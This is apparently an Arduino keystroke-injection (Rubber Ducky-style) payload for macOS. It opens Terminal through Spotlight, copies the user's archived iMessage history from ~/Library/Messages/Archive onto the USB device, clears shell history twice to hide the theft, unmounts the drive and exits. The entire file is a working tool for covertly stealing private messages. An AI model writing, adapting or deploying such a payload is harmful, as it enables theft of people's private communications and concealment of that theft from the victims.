void typeKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup() {
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(150);

  Keyboard.print("Terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("cp -r ~/Library/Messages/Archive /Volumes/RubberDucky/$USER/");

  typeKey(KEY_RETURN);

  Keyboard.print("history -c");

  typeKey(KEY_RETURN);

  Keyboard.print("diskutil umount /Volumes/RubberDucky");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("history -c");

  typeKey(KEY_RETURN);

  Keyboard.print("echo 5A13X99");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  delay(250);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
